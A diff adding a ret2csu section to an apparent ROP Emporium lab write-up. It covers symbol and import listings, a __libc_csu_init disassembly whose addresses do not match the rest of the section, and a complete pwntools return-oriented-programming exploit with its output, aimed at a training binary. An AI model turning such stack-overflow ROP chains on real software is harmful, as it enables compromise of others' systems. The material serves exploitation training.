@@ -1163,3 +1163,204 @@ ROPE{a_placeholder_32byte_flag!}
 [*] Got EOF while reading in interactive
 $  
 ```
+## Ret2csu
+
+### NM
+```
+[root:~/Downloads/RopEmporium]# nm ./ret2csu | grep " t \| T "
+0000000000400630 t deregister_tm_clones
+0000000000400620 T _dl_relocate_static_pie
+00000000004006a0 t __do_global_dtors_aux
+00000000004008b4 T _fini
+00000000004006d0 t frame_dummy
+0000000000400560 T _init
+00000000004008b0 T __libc_csu_fini
+0000000000400840 T __libc_csu_init
+00000000004006d7 T main
+0000000000400714 t pwnme
+0000000000400660 t register_tm_clones
+00000000004007b1 T ret2win
+00000000004005f0 T _start
+```
+
+### Rabin2
+```
+[root:~/Downloads/RopEmporium]# rabin2 -i ret2csu
+[Imports]
+Num  Vaddr       Bind      Type Name
+   1 0x00400590  GLOBAL    FUNC puts
+   2 0x004005a0  GLOBAL    FUNC system
+   3 0x004005b0  GLOBAL    FUNC printf
+   4 0x004005c0  GLOBAL    FUNC memset
+   5 0x00000000  GLOBAL    FUNC __libc_start_main
+   6 0x004005d0  GLOBAL    FUNC fgets
+   7 0x00000000    WEAK  NOTYPE __gmon_start__
+   8 0x004005e0  GLOBAL    FUNC setvbuf
+   5 0x00000000  GLOBAL    FUNC __libc_start_main
+   7 0x00000000    WEAK  NOTYPE __gmon_start__
+```
+
+### Use gadgets from __libc_csu_init
+```
+0000000000400b10 <__libc_csu_init>:                                                                                                                                                              
+  400b10:       41 57                   push   r15                                                                                                                                               
+  400b12:       41 56                   push   r14                                                                                                                                               
+  400b14:       41 89 ff                mov    r15d,edi                                                                                                                                          
+  400b17:       41 55                   push   r13                                                                                                                                               
+  400b19:       41 54                   push   r12                                                                                                                                               
+  400b1b:       4c 8d 25 ce 12 20 00    lea    r12,[rip+0x2012ce]        # 601df0 <__frame_dummy_init_array_entry>                                                                               
+  400b22:       55                      push   rbp                                                                                                                                               
+  400b23:       48 8d 2d ce 12 20 00    lea    rbp,[rip+0x2012ce]        # 601df8 <__init_array_end>                                                                                             
+  400b2a:       53                      push   rbx                                                                                                                                               
+  400b2b:       49 89 f6                mov    r14,rsi
+  400b2e:       49 89 d5                mov    r13,rdx
+  400b31:       4c 29 e5                sub    rbp,r12
+  400b34:       48 83 ec 08             sub    rsp,0x8
+  400b38:       48 c1 fd 03             sar    rbp,0x3
+  400b3c:       e8 77 fc ff ff          call   4007b8 <_init>
+  400b41:       48 85 ed                test   rbp,rbp
+  400b44:       74 20                   je     400b66 <__libc_csu_init+0x56>
+  400b46:       31 db                   xor    ebx,ebx
+  400b48:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
+  400b4f:       00 
+  400b50:       4c 89 ea                mov    rdx,r13
+  400b53:       4c 89 f6                mov    rsi,r14
+  400b56:       44 89 ff                mov    edi,r15d
+  400b59:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
+  400b5d:       48 83 c3 01             add    rbx,0x1
+  400b61:       48 39 eb                cmp    rbx,rbp
+  400b64:       75 ea                   jne    400b50 <__libc_csu_init+0x40>
+  400b66:       48 83 c4 08             add    rsp,0x8
+  400b6a:       5b                      pop    rbx
+  400b6b:       5d                      pop    rbp
+  400b6c:       41 5c                   pop    r12
+  400b6e:       41 5d                   pop    r13
+  400b70:       41 5e                   pop    r14
+  400b72:       41 5f                   pop    r15
+  400b74:       c3                      ret    
+  400b75:       90                      nop
+  400b76:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
+  400b7d:       00 00 00 
+```
+### Function: _fini
+```
+0000000000400b84 <_fini>:
+  400b84:       48 83 ec 08             sub    rsp,0x8
+  400b88:       48 83 c4 08             add    rsp,0x8
+  400b8c:       c3                      ret 
+```
+### Getting a pointer to _fini using it's address in PLT
+```
+pwndbg> x/10xg  &_DYNAMIC
+0x600e20:       0x0000000000000001      0x0000000000000001
+0x600e30:       0x000000000000000c      0x0000000000400560
+<b>0x600e40:       0x000000000000000d      0x00000000004008b4</b>
+0x600e50:       0x0000000000000019      0x0000000000600e10
+0x600e60:       0x000000000000001b      0x0000000000000008
+```
+```
+pwndbg> x/x 0x600e48
+0x600e48:       0x00000000004008b4
+```
+### Exploit
+```
+#!/usr/bin/env python
+# Import the library
+from pwn import *
+
+# Debugging
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-v']
+
+# Binary has NX set - no typical BOF - 
+# Help info: http://docs.pwntools.com/en/stable/intro.html
+# Useful doc: https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html
+
+elf = ELF("ret2csu")
+
+# Objective:
+# The third argument (rdx) must be 0xdeadcafebabebeef
+# 
+# Move '0xdeadcafebabebeef' to memory
+# Get the memory address into rdx
+# Jump to ret2win
+
+# Addresses
+#
+callGadget = p64(0x600e48)
+
+# Gadgets
+#
+# 0x40089a <__libc_csu_init+90>:       pop    rbx,pop    rbp,pop    r12,pop    r13,pop    r14,pop    r15,ret   
+csupopGadget = p64(0x40089a)
+#    0x400880 <__libc_csu_init+64>:       mov    rdx,r15, mov    rsi,r14, mov    edi,r13d, call   QWORD PTR [r12+rbx*8]
+csumovGadget = p64(0x400880)
+# Address of ret2win: 0x00000000004007b1
+ret2win = p64(0x00000000004007b1)
+
+payload = "a" * 40
+payload += csupopGadget
+payload += p64(0x00)        # Reg: rbx
+payload += p64(0x01)        # Reg: rbp
+payload += callGadget    # Reg: r12
+payload += p64(0x00)        # Reg: r13
+payload += p64(0x00)        # Reg: r14
+payload += p64(0xdeadcafebabebeef)  # Reg: r15
+payload += csumovGadget
+payload += p64(0x00)        # Satisfy add rsp
+payload += p64(0x00)        # Satisfy pop rbx
+payload += p64(0x00)        # Satisfy pop rbp
+payload += p64(0x00)        # Satisfy pop r12
+payload += p64(0x00)        # Satisfy pop r13
+payload += p64(0x00)        # Satisfy pop r14
+payload += p64(0x00)        # Satisfy pop r15
+payload += ret2win          # Call ret2win :-)
+
+# GTG!
+io = elf.process()
+gdb.attach(io,"""
+fin
+fin
+fin
+fin
+fin
+b *pwnme+156
+c
+""")
+io.sendline(payload)
+io.interactive()
+```
+
+### Result
+```
+DEBUG] Sent 0xa9 bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000020  61 61 61 61  61 61 61 61  9a 08 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
+    00000030  00 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  │····│····│····│····│
+    00000040  48 0e 60 00  00 00 00 00  00 00 00 00  00 00 00 00  │H·`·│····│····│····│
+    00000050  00 00 00 00  00 00 00 00  ef be be ba  fe ca ad de  │····│····│····│····│
+    00000060  80 08 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
+    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    000000a0  b1 07 40 00  00 00 00 00  0a                        │··@·│····│·│
+    000000a9
+[*] Switching to interactive mode
+[DEBUG] Received 0x5f bytes:
+    'ret2csu by ROP Emporium\n'
+    '\n'
+    'Call ret2win()\n'
+    'The third argument (rdx) must be 0xdeadcafebabebeef\n'
+    '\n'
+    '> '
+ret2csu by ROP Emporium
+
+Call ret2win()
+The third argument (rdx) must be 0xdeadcafebabebeef
+
+> [DEBUG] Received 0x21 bytes:
+    'ROPE{a_placeholder_32byte_flag!}\n'
+ROPE{a_placeholder_32byte_flag!}
+[*] Got EOF while reading in interactive
+```
